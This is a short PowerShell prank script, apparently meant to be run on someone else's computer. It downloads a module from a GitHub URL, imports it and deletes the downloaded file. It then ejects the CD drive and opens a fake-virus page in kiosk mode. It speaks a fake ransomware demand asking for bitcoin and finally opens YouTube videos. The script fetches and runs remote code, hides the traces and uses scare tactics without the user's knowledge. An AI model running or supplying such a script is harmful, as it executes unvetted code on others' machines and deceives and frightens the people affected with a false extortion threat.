Invoke-WebRequest -Uri "https://raw.githubusercontent.com/perplexityjeff/PowerShell-Troll/master/PSTrollFunctions.psm1" -OutFile "PSTrollFunctions.psm1";
Import-Module .\PSTrollFunctions.psm1;
rm PSTrollFunctions.psm1;
Open-CDDrive
Start-Process iexplore -ArgumentList "-k https://geekprank.com/fake-virus/"
Add-Type -AssemblyName System.speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer;
$speak.Speak("You Have Been Hack, a crypto locker will execute, send bitcoin to my address now");
Start-Sleep -s 6;
Start-Process "https://www.youtube.com/embed/xvFZjo5PgG0?autoplay=1";
get-process iexplore | stop-process
Start-Sleep -s 10;
Start-Process "https://www.youtube.com/watch?v=BYIzxLIW71E";
Start-Sleep -s 72;
$speak.Speak("have you see the quenouille!");
